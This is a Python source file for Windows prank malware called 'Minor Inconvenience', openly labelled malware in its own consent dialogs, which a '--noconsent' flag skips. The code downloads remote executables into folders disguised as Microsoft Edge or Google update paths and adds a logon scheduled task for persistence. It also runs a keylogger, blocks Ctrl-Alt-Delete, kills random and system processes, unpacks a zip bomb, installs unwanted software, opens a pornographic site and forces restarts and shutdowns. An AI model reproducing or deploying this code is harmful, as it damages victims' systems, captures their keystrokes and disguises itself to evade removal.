import os
import psutil
from tkinter.messagebox import askokcancel
from pynput import mouse, keyboard
import webbrowser
import tkinter as tk
from tkinter import ttk
import random
import time
import requests
import zipfile
import tempfile as tf
from PIL import Image, ImageTk
import sys
import threading
import ctypes
import win32con
from pathlib import Path


# Minor Inconvenience


tmpdir = tf.gettempdir()
imgdir = f"{tmpdir}\\img"
yaaidir = f"{tmpdir}\\Microsoft\\Edge\\Update\\92.0.902.67"
bsoddir = f"{tmpdir}\\GoogleUpdateService\\125.0.112.5"
pers_dir = f"{os.getenv("APPDATA")}\\Microsoft\\Edge\\Profiles"
_exe = None
files = [f"{tmpdir}\\bluescreen.pyw", f"{tmpdir}\\Etc\\logo.png", f"{tmpdir}\\Etc\\qr.png", f"{yaaidir}\\MicrosoftEdgeUpdate.exe", f"{yaaidir}\\youareanidiot.gif", f"{yaaidir}\\yaai.wav", "{yaaidir}\\yaai.ico", f"{bsoddir}\\chrome.exe", f"{bsoddir}\\Etc\\qr.png", f"{bsoddir}\\chrome.ico", f"{tmpdir}\\img\\bg.png", f"{pers_dir}\\app.json"]
root = tk.Tk()
root.lift()
root.attributes("-topmost", True)
root.withdraw()
list_of_windows = []
payloads = ["Fake Bluescreen", "You are an idiot", "Open a website", "Open random websites", "Crash Computer", "Display an image", "Display all images", "Start keylogging", "Show logged keys", "Enable Persistence", "Disable Persistence", "Change Desktop Wallpaper"]
_mouse = mouse.Controller()
_keyboard = keyboard.Controller()
_websites = ["https://www.google.com/search?q=how+to+get+free+robux", "https://www.google.com/search?q=bandicam+crack+free+download", "https://www.google.com/search?q=big+booty+latinas", "https://www.google.com/search?q=what+happened+to+the+titan+submarine", "https://www.google.com/search?q=do+i+have+a+virus", "https://www.google.com/search?q=chat+gpt+help+me+with+my+homework+plz", "https://unforgettable.dk", "https://www.google.com/search?q=microshaft+winblows+98", "https://among.us", "https://"]
_pressed_keys = []
_pressed_cad = set()

# wmplayer.exe Windows Media Service
def persistent():
    try:
        os.makedirs(pers_dir)
    except FileExistsError:
        pass

    _dl_starter = True
    for file in os.listdir(pers_dir):
        if file == "MSEdgeProfileMigration.exe":
            _dl_starter = False
            
    if _dl_starter:
        starter_dl = requests.get("https://raw.githubusercontent.com/bazthedev/MinorInconvenience/main/MSEPM/MSEdgeProfileMigration.exe")
        with open(f"{pers_dir}\\MSEdgeProfileMigration.exe", "wb") as msepm_dl:
            msepm_dl.write(starter_dl.content)
            msepm_dl.close()
        

    os.system(f"schtasks /Create /TR {pers_dir}\\MSEdgeProfileMigration.exe /TN MicrosoftEdgeUpdateService /SC ONLOGON /rl HIGHEST")

def unpersistent():
    os.system("schtasks /delete /tn MicrosoftEdgeUpdateService /f")
    try:
        os.remove(f"{pers_dir}\\MSEdgeProfileMigration.exe")
    except FileNotFoundError:
        pass

def kill_explorer():
    os.system("taskkill /f /im explorer.exe /t")

def press_random_keys():
    while True:
        time.sleep(random.randint(0, 60))
        _keyboard.press(random.choice())

def cad_chk(key):
    combo = [keyboard.Key.alt, keyboard.Key.alt, keyboard.Key.delete]
    if key in combo:
        _pressed_cad.add(key)

    if _pressed_cad == combo:
        _keyboard.press(keyboard.Key.esc)
        _keyboard.release(keyboard.Key.esc)
        _pressed_cad.clear()

def anti_cad():
    with keyboard.Listener(on_press=cad_chk) as cadl:
        cadl.join()

def change_bg(img_path : str):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, img_path , 0)

def restart_pc(_time : int = 0, _msg : str = None):
    if _msg == None:
        os.system(f"shutdown /r /t {_time}")
    else:
        os.system(f"shutdown /r /t {_time} /c \"{_msg}\"")

def shutdown_pc(_time : int = 0, _msg : str = None):
    if _msg == None:
        os.system(f"shutdown /s /t {_time}")
    else:
        os.system(f"shutdown /s /t {_time} /c \"{_msg}\"")

def kill_random_process():
    while True:
        found = False
        process = None
        _nokill = ["svchost.exe", "wininit.exe", "MpDefenderCoreService.exe", "MsMpEng.exe", "ApplicationFrameHost.exe", "dllhost.exe", "cftmon.exe", "dasHost.exe", "ntoskrnl.exe", "dwm.exe", "smss.exe", "winlogon.exe "]
        while found == False:
            proc = random.choice(psutil.process_iter())
            if proc.name() not in _nokill:
                process = proc.name()
                found = True
        os.system(f"taskkill /f /im {process} /t")
        time.sleep(random.randint(30, 120))

def dl_imgs():
    try:
        os.remove(f"{tmpdir}\\imgs.zip")
    except FileNotFoundError:
        pass
    try:
        for file in os.listdir(f"{imgdir}\\"):
            try:
                os.remove(f"{imgdir}\\{file}")
            except OSError:
                pass
    except FileNotFoundError:
        pass
    imgzip = requests.get("https://raw.githubusercontent.com/bazthedev/MinorInconvenience/main/imgs.zip")
    with open(f"{tmpdir}\\imgs.zip", "wb") as imgdl:
        imgdl.write(imgzip.content)
        imgdl.close()
    with zipfile.ZipFile(f"{tmpdir}\\imgs.zip", "r") as imgdlzip:
        imgdlzip.extractall(f"{tmpdir}\\img\\")

def open_explorer():
    os.startfile("explorer.exe")

def open_calc():
    os.startfile("calc.exe")

def explorer_spam(amt : int):
    for _ in range(0, amt):
        open_explorer()

def phub_instant():
    _mouse.position = (10, 1070)
    time.sleep(0.1)
    _keyboard.press(keyboard.Key.cmd)
    _keyboard.release(keyboard.Key.cmd)
    time.sleep(1)
    _keyboard.type("p")
    time.sleep(1)
    _keyboard.type("o")
    time.sleep(1)
    _keyboard.type("r")
    time.sleep(1)
    _keyboard.type("t forwarding")
    time.sleep(2)
    _keyboard.press(keyboard.Key.ctrl_l)
    _keyboard.press("a")
    time.sleep(0.1)
    _keyboard.release(keyboard.Key.ctrl_l)
    _keyboard.release("a")
    time.sleep(0.2)
    _keyboard.press(keyboard.Key.backspace)
    time.sleep(0.2)
    _keyboard.release(keyboard.Key.backspace)
    time.sleep(0.2)
    _keyboard.type("https://pornhub.com/")
    _mouse.move(110, -530)
    time.sleep(1)
    _mouse.click(mouse.Button.left)

def shake_mouse():
    while True:
        _mouse.move(random.randint(1, 100), random.randint(1, 100))

def open_website(page : str):
    webbrowser.open(page, 1)

def crash(wait_time : float):
    time.sleep(wait_time)
    os.system("taskkill /f /im svchost.exe /t")

def dl_zip_bomb():
    szdl = requests.get("https://raw.githubusercontent.com/bazthedev/MinorInconvenience/main/7za/7za.exe")
    with open(f"{tmpdir}\\7za.exe", "wb") as sz:
        sz.write(szdl.content)
        sz.close()
    zbdl = requests.get("http://www.unforgettable.dk/42.zip")
    with open(f"{tmpdir}\\42.zip", "wb") as zb:
        zb.write(zbdl.content)
        zb.close()


def run_zip_bomb():
    dl_zip_bomb()
    os.system(f"{tmpdir}\\7za.exe x -o%temp%\\* -p42 -y {tmpdir}\\42.zip")
    for f in os.listdir(f"{tmpdir}\\42\\"):
        os.system(f"{tmpdir}\\7za.exe x -o%temp%\\42\\*\\ -p42 -y \"{tmpdir}\\42\\{f}\"")
    for s in os.listdir(f"{tmpdir}\\42\\"):
        if s.endswith(".zip"):
            continue
        for z in os.listdir(f"{tmpdir}\\42\\{s}\\"):
            os.system(f"{tmpdir}\\7za.exe x -o\"%temp%\\42\\{s}\\*\" -p42 -y \"{tmpdir}\\42\\{s}\\{z}\"")
    for s in os.listdir(f"{tmpdir}\\42\\"):
        if s.endswith(".zip"):
            continue
        for z in os.listdir(f"{tmpdir}\\42\\{s}\\"):
            if z.endswith(".zip"):
                continue
            for c in os.listdir(f"{tmpdir}\\42\\{s}\\{z}\\"):
                os.system(f"{tmpdir}\\7za.exe x -o\"%temp%\\42\\{s}\\{z}\\*\" -p42 -y \"{tmpdir}\\42\\{s}\\{z}\\{c}\"")
    for s in os.listdir(f"{tmpdir}\\42\\"):
        if s.endswith(".zip"):
            continue
        for z in os.listdir(f"{tmpdir}\\42\\{s}\\"):
            if z.endswith(".zip"):
                continue
            for c in os.listdir(f"{tmpdir}\\42\\{s}\\{z}\\"):
                if c.endswith(".zip"):
                    continue
                for d in os.listdir(f"{tmpdir}\\42\\{s}\\{z}\\{c}\\"):
                    os.system(f"{tmpdir}\\7za.exe x -o\"%temp%\\42\\{s}\\{z}\\{c}\\*\" -p42 -y \"{tmpdir}\\42\\{s}\\{z}\\{c}\\{d}\"")
    for s in os.listdir(f"{tmpdir}\\42\\"):
        if s.endswith(".zip"):
            continue
        for z in os.listdir(f"{tmpdir}\\42\\{s}\\"):
            if z.endswith(".zip"):
                continue
            for c in os.listdir(f"{tmpdir}\\42\\{s}\\{z}\\"):
                if c.endswith(".zip"):
                    continue
                for d in os.listdir(f"{tmpdir}\\42\\{s}\\{z}\\{c}\\"):
                    if d.endswith(".zip"):
                        continue
                    for p in os.listdir(f"{tmpdir}\\42\\{s}\\{z}\\{c}\\{d}\\"):
                        os.system(f"{tmpdir}\\7za.exe x -o\"%temp%\\42\\{s}\\{z}\\{c}\\{d}\\*\" -p42 -y \"{tmpdir}\\42\\{s}\\{z}\\{c}\\{d}\\{p}\"")
    for s in os.listdir(f"{tmpdir}\\42\\"):
        if s.endswith(".zip"):
            continue
        for z in os.listdir(f"{tmpdir}\\42\\{s}\\"):
            if z.endswith(".zip"):
                continue
            for c in os.listdir(f"{tmpdir}\\42\\{s}\\{z}\\"):
                if c.endswith(".zip"):
                    continue
                for d in os.listdir(f"{tmpdir}\\42\\{s}\\{z}\\{c}\\"):
                    if d.endswith(".zip"):
                        continue
                    for p in os.listdir(f"{tmpdir}\\42\\{s}\\{z}\\{c}\\{d}\\"):
                        if p.endswith(".zip"):
                            continue
                        for l in os.listdir(f"{tmpdir}\\42\\{s}\\{z}\\{c}\\{d}\\{p}\\"):
                            os.system(f"{tmpdir}\\7za.exe x -o\"%temp%\\42\\{s}\\{z}\\{c}\\{d}\\{p}\\*\" -p42 -y \"{tmpdir}\\42\\{s}\\{z}\\{c}\\{d}\\{p}\\{l}\"")

def fake_bsod():
    if _exe:
        os.system(f"{bsoddir}\\chrome.exe")
    else:
        os.system(f"py {tmpdir}\\bluescreen.pyw")

def install_winget():
    wgdl = requests.get("https://aka.ms/getwinget")
    with open(f"{tmpdir}\\winget.msixbundle", "wb") as wgf:
        wgf.write(wgdl.content)
        wgf.close()
    vcdl = requests.get("https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx")
    with open(f"{tmpdir}\\vclibs.appx", "wb") as vcf:
        vcf.write(vcdl.content)
        vcf.close()
    xamldl = requests.get("https://github.com/microsoft/microsoft-ui-xaml/releases/download/v2.8.6/Microsoft.UI.Xaml.2.8.x64.appx")
    with open(f"{tmpdir}\\ui.xaml.appx", "wb") as xamlf:
        xamlf.write(xamldl.content)
        xamlf.close()
    os.system(f"powershell -Command \"Add-AppxPackage -Path {tmpdir}\\vclibs.appx\"")
    os.system(f"powershell -Command \"Add-AppxPackage -Path {tmpdir}\\ui.xaml.appx\"")
    os.system(f"powershell -Command \"Add-AppxPackage -Path {tmpdir}\\winget.msixbundle\"")

def install_bonzi():
    bonzi_dl = requests.get("http://bonzi.link/Bon.zip")
    with open(f"{tmpdir}\\Bon.zip", "wb") as bzdl:
        bzdl.write(bonzi_dl.content)
        bzdl.close()
    with zipfile.ZipFile(f"{tmpdir}\\Bon.zip") as bzzip:
        bzzip.extractall(f"{tmpdir}")
    os.system(f"{tmpdir}\\BonziBuddy432 /s")
    os.system("\"C:\\Program Files x86\\BonziBuddy432\\BonziBDY_4.exe")

def install_opera():
    os.system("winget install --id=Opera.Opera  -e")

def install_winzip():
    os.system("winget install --id=Corel.WinZip  -e")

def install_ccleaner():
    os.system("winget install --id=Piriform.CCleaner  -e")

def install_iobit():
    os.system("winget install --id=IObit.MalwareFighter  -e")
    os.system("winget install --id=IObit.AdvancedSystemCare  -e")

def install_shitware():
    install_winget()
    install_opera()
    install_ccleaner()
    install_iobit()
    install_winzip()

def add_key_to_list(key):
    _pressed_keys.append(key)

def key_logger():
    with keyboard.Listener(on_press=add_key_to_list) as listener:
        listener.join()

def close_window(i, list_var):
    list_var[i][0].destroy()
    del list_var[i][0]

def close_windows(list_var):
    for window in list_var:
        window[0].destroy()

def play_gif(imagelist, label):
    img = next(imagelist)
    label.img = ImageTk.PhotoImage(img)
    label.config(image=label.img)
    label.after(100, play_gif, imagelist, label) 

def youareanidiot():
        if _exe:
            os.system(f"{yaaidir}\\MicrosoftEdgeUpdate.exe")
        else:
            os.system(f"py {tmpdir}\\idiot.pyw")

def display_image(image_file : str):
    i = tk.Toplevel(root)
    displ_im = Image.open(image_file)
    w, h = displ_im.size
    displ_im.close()
    i.geometry(f"{str(w)}x{str(h)}+{random.randint(0,i.winfo_screenwidth())}+{random.randint(0,i.winfo_screenheight())}")
    i.resizable(False, False)
    i.title("minor inconvenience")
    _dsp_im = ImageTk.PhotoImage(file=image_file)
    _dsp_label = ttk.Label(i, image=_dsp_im)
    _dsp_label.pack()
    i.lift()
    i.attributes("-topmost", True)
    try:
        ico = Image.open(f'{tf.gettempdir()}\\Etc\\chrome.ico')
        photo = ImageTk.PhotoImage(ico)
        root.wm_iconphoto(False, photo)
    except Exception:
        pass
    i.mainloop()

#def random_keys():
    #_keyboard.press(random.choice)

def dsp_all_imgs():
    for img in os.listdir(f"{tmpdir}\\img\\"):
        if img.endswith(".png") and img != "bg.png":
            threading.Thread(target=display_image, args=((f"{tmpdir}\\img\\{str(img)}",))).start()

def random_site(site_list : list, sites_to_open : int, wait : int):
    for _ in range(0, sites_to_open):
        open_website(random.choice(site_list))
        time.sleep(wait)

def get_wallpaper():
    ubuf = ctypes.create_unicode_buffer(512)
    ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_GETDESKWALLPAPER,len(ubuf),ubuf,0)
    return ubuf.value

def fake_license():
    if _exe:
        rdl = requests.get("https://raw.githubusercontent.com/bazthedev/MinorInconvenience/main/runner/runner.exe")
        with open(f"{tmpdir}\\runner.exe", "wb") as rndl:
            rndl.write(rdl.content)
            rndl.close()
        os.system(f"{tmpdir}\\runner.exe")
    else:
        with open(f".\\runner.bat", "w") as rb:
            rb.write("""
        @echo off
        echo[
        echo[
        echo[
        echo[
        echo[
        echo            This program was made with an Unlicensed compiler.
        echo            Please buy the PRO version to distribute your EXE.
                    echo[      
                    echo[      
                        echo[      
                    echo[      
                        echo[      
        echo[      
        echo[
        pause   
    """)
            rb.close()
        
        os.system(f".\\runner.bat")

def runpayload():
    _output.config(state=tk.NORMAL)
    ap.withdraw()
    if pl_to_run.get() == "You are an idiot":
        _output.insert(tk.END, "Running you are an idiot")
        threading.Thread(target=youareanidiot).start() #, args=(int(_site.get()), int(_site2.get()))).start()
    elif pl_to_run.get() == "Fake Bluescreen":
        _output.insert(tk.END, "Running fake bluescreen")
        threading.Thread(target=fake_bsod).start()
    elif pl_to_run.get() == "Open a website":
        site = _site.get()
        _output.insert(tk.END, f"Opening site: {site}")
        threading.Thread(target=open_website, args=(site)).start()
    elif pl_to_run.get() == "Open random websites":
        _output.insert(tk.END, f"Opening {_site.get()} sites, and waiting {_site2.get()} seconds between opening a new site")
        threading.Thread(target=random_site, args=(_websites, int(_site.get()), int(_site2.get()))).start()
    elif pl_to_run.get() == "Crash Computer":
        _output.insert(tk.END, "Crashing Computer")
        crash(10)
    elif pl_to_run.get() == "Display an image":
        _output.insert(tk.END, f"Displaying image: {_site.get()}")
        threading.Thread(target=display_image, args=(str(_site.get()),)).start()
    elif pl_to_run.get() == "Display all images":
        _output.insert(tk.END, f"Displaying all images in {imgdir}")
        threading.Thread(target=dsp_all_imgs).start()
    elif pl_to_run.get() == "Start keylogging":
        _output.insert(tk.END, "Started keylogging")
        threading.Thread(target=key_logger).start()
    elif pl_to_run.get() == "Show logged keys":
        _output.insert(tk.END, str(_pressed_keys))
    elif pl_to_run.get() == "Enable Persistence":
        _output.insert(tk.END, "Persistence enabled")
        persistent()
    elif pl_to_run.get() == "Disable Persistence":
        _output.insert(tk.END, "Persistence disabled")
        unpersistent()
    elif pl_to_run.get() == "Change Desktop Wallpaper":
        _output.insert(tk.END, f"Changed Desktop Wallpaper to: {_site.get()}")
        change_bg(_site.get())
    _output.insert(tk.END, "\n")
    _output.config(state=tk.DISABLED)
    ap.deiconify()

def create_sf():
    sf = open(f"{pers_dir}\\app.json")
    sf.write("""{
             "name": "Microsoft Edge Profile Migration Tool",
             "description": "A tool used by Microsoft Edge to automatically import your browsing preferences into Edge",
             "version": 0,
             "profile_no": 0
             }""")
    sf.close()

def find_stage():
    with open(f"{pers_dir}\\app.json", "r") as a:
        stage = a["version"]
        return stage

if "--no-balls" in sys.argv:
    try:
        for file in os.listdir(f"{pers_dir}\\backup\\"):
            if file.startswith("backup"):
                change_bg(f"{pers_dir}\\backup\\{file}")
    except FileNotFoundError:
        pass
    unpersistent()
    for file in files:
        try:
            os.remove(file)
        except FileNotFoundError:
            pass
    exit()

if "--noconsent" not in sys.argv:
    ready = askokcancel("WARNING: VIRUS EXECUTED", "You have just executed malware, luckily I'm a nice person.\nAre you sure you want to continue with the execution?")
    if ready == True:
        confirm = askokcancel("WARNING: FINAL CHANCE TO STOP", "This is not a joke, this malware is very annoying.\n\nARE YOU SURE YOU WISH TO EXECUTE?\nTHE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED!")
        if confirm != True:
            exit()
    else:
        exit()

if "--no-dl" not in sys.argv:
    dl_imgs()

if "--user" in sys.argv:
    tmpdir = "."
    for file in files:
            try:
                os.remove(file)
            except FileNotFoundError:
                pass
    _exe = False
    bsod_dl = requests.get("https://github.com/bazthedev/Bluescreen/releases/download/minorinconvenience/bsod_mi_py.zip")
    with open(f"{tmpdir}\\bsod_mi.zip", "wb") as bs:
            bs.write(bsod_dl.content)
            bs.close()

    with zipfile.ZipFile(f"{tmpdir}\\bsod_mi.zip", "r") as bsod_zip:
            bsod_zip.extractall(f"{tmpdir}\\")

    yaai_dl = requests.get("https://github.com/bazthedev/YouAreAnIdiotPy/releases/download/minorinconvenience/yaaipyw.zip")
    with open(f"{tmpdir}\\yaaipy.zip", "wb") as y:
            y.write(yaai_dl.content)
            y.close()

    with zipfile.ZipFile(f"{tmpdir}\\yaaipy.zip", "r") as yaai_zip:
            yaai_zip.extractall(f"{tmpdir}\\")
    _exe = False
else:
    try:
        try:
            os.makedirs(f"{yaaidir}\\")
        except FileExistsError:
            pass
        try:
            os.makedirs(f"{bsoddir}\\")
        except FileExistsError:
            pass
        for file in files:
            try:
                os.remove(file)
            except FileNotFoundError:
                pass
        bsod_dl_exe = requests.get("https://github.com/bazthedev/Bluescreen/releases/download/minorinconvenience/bsod_mi_exe.zip")
        with open(f"{bsoddir}\\bsod_mi.zip", "wb") as bs:
            bs.write(bsod_dl_exe.content)
            bs.close()
        with zipfile.ZipFile(f"{bsoddir}\\bsod_mi.zip", "r") as bsod_zip:
            bsod_zip.extractall(f"{bsoddir}\\")
        yaai_dl = requests.get("https://github.com/bazthedev/YouAreAnIdiotPy/releases/download/minorinconvenience/yaaipy_exe.zip")
        with open(f"{yaaidir}\\yaaipy.zip", "wb") as y:
                y.write(yaai_dl.content)
                y.close()
        with zipfile.ZipFile(f"{yaaidir}\\yaaipy.zip", "r") as yaai_zip:
            yaai_zip.extractall(f"{yaaidir}\\")
        try:
            os.remove(f"{yaaidir}\\yaaipy.zip")
        except FileNotFoundError:
            pass
        try:
            os.remove(f"{bsoddir}\\bsod_mi.zip")
        except FileNotFoundError:
            pass
        _exe = True
    except OSError:
        tmpdir = "."
        for file in files:
            try:
                os.remove(file)
            except FileNotFoundError:
                pass
        bsod_dl = requests.get("https://github.com/bazthedev/Bluescreen/releases/download/minorinconvenience/bsod_mi_py.zip")
        with open(f"{tmpdir}\\bsod_mi.zip", "wb") as bs:
            bs.write(bsod_dl.content)
            bs.close()
        with zipfile.ZipFile(f"{tmpdir}\\bsod_mi.zip", "r") as bsod_zip:
            bsod_zip.extractall(f"{tmpdir}\\")
        yaai_dl = requests.get("https://github.com/bazthedev/YouAreAnIdiotPy/releases/download/minorinconvenience/yaaipyw.zip")
        with open(f"{tmpdir}\\yaaipy.zip", "wb") as y:
                y.write(yaai_dl.content)
                y.close()
        with zipfile.ZipFile(f"{tmpdir}\\yaaipy.zip") as yaai_zip:
            yaai_zip.extractall(f"{tmpdir}\\")
        _exe = False

if "--debug-menu" in sys.argv:
    pl_to_run = tk.StringVar()
    pl_to_run.set("Fake Bluescreen")
    _site = tk.StringVar()
    _site2 = tk.StringVar()
    ap = tk.Toplevel(root)
    ap.geometry("348x480+1000+500")
    ap.title("Debug Menu")
    _execute_payload_options = tk.OptionMenu(ap, pl_to_run, *payloads)
    _execute_payload_options.pack()
    _exe_button = tk.Button(ap, text="Execute Payload", command=runpayload).pack()
    _box1 = tk.Label(ap, text="Additional Arguements:").pack()
    _website = tk.Entry(ap, bg="light grey", textvariable=_site).pack()
    _box2 = tk.Label(ap, text="Additional Arguements:").pack()
    _website2 = tk.Entry(ap, bg="light grey", textvariable=_site2).pack()
    _out_label = tk.Label(ap, text="Command output:").pack()
    _output = tk.Text(ap, bg="light grey")
    _output.config(state=tk.DISABLED)
    _output.pack()
    ap.mainloop()




persistent()
dl_imgs()
old_bg = get_wallpaper()
old_bg_path = Path(old_bg)
try:
    os.mkdir(f"{pers_dir}\\backup\\")
except OSError:
    pass
keylogging = threading.Thread(target=key_logger)
keylogging.start()
os.system(f"copy /Y /B {old_bg} {pers_dir}\\backup\\backup{old_bg_path.suffix}")
change_bg(f"{tmpdir}\\img\\bg.png")
threading.Thread(target=anti_cad).start()
stage = 1
stages_done = []
while True:
    if len(stages_done) == 4:
        stages_done = []
        stage += 1
    pl = random.randint(1, 4)
    if stage == 1:
        if pl == 1 and pl not in stages_done:
            pl_thread_1 = threading.Thread(target=shake_mouse)
            stages_done.append(pl)
        elif pl == 2 and pl not in stages_done:
            pl_thread_2 = threading.Thread(target=explorer_spam, args=(random.randint(10, 20),))
            pl_thread_2.start()
            stages_done.append(pl)
        elif pl == 3 and pl not in stages_done:
            pl_thread_3 = threading.Thread(target=fake_license)
            pl_thread_3.start()
            stages_done.append(pl)
        elif pl == 4 and pl not in stages_done:
            pl_thread_4 = threading.Thread(target=open_calc)
            pl_thread_4.start()
            stages_done.append(pl)
    elif stage == 2:
        if pl == 1 and pl not in stages_done:
            pl_thread_1 = threading.Thread(target=restart_pc, args=(random.randint(15, 60), "just a minor inconvenience",))
            pl_thread_1.start()
            stages_done.append(pl)
        elif pl == 2 and pl not in stages_done:
            pl_thread_2 = threading.Thread(target=random_site, args=(_websites, random.randint(10, 30), random.randint(15, 45),))
            pl_thread_2.start()
            stages_done.append(pl)
        elif pl == 3 and pl not in stages_done:
            pl_thread_3 = threading.Thread(target=install_shitware)
            pl_thread_3.start()
            stages_done.append(pl)
        elif pl == 4 and pl not in stages_done:
            pl_thread_4 = threading.Thread(target=phub_instant)
            pl_thread_4.start()
            stages_done.append(pl)
    elif stage == 3:
        if pl == 1 and pl not in stages_done:
            pl_thread_1 = threading.Thread(target=install_bonzi)
            pl_thread_1.start()
            stages_done.append(pl)
        elif pl == 2 and pl not in stages_done:
            pl_thread_2 = threading.Thread(target=fake_bsod)
            pl_thread_2.start()
            stages_done.append(pl)
        elif pl == 3 and pl not in stages_done:
            pl_thread_3 = threading.Thread(target=youareanidiot)
            pl_thread_3.start()
            stages_done.append(pl)
        elif pl == 4 and pl not in stages_done:
            pl_thread_4 = threading.Thread(target=kill_random_process)
            pl_thread_4.start()
            stages_done.append(pl)
    elif stage == 4:
        if pl == 1 and pl not in stages_done:
            pl_thread_1 = threading.Thread(target=crash)
            pl_thread_1.start()
            stages_done.append(pl)
        elif pl == 2 and pl not in stages_done:
            pl_thread_2 = threading.Thread(target=kill_explorer)
            pl_thread_2.start()
            stages_done.append(pl)
        elif pl == 3 and pl not in stages_done:
            pl_thread_3 = threading.Thread(target=run_zip_bomb)
            pl_thread_3.start()
            stages_done.append(pl)
            break
        elif pl == 4 and pl not in stages_done:
            pl_thread_4 = threading.Thread(target=shutdown_pc)
            pl_thread_4.start()
            stages_done.append(pl)
    time.sleep(random.randint(1, 15))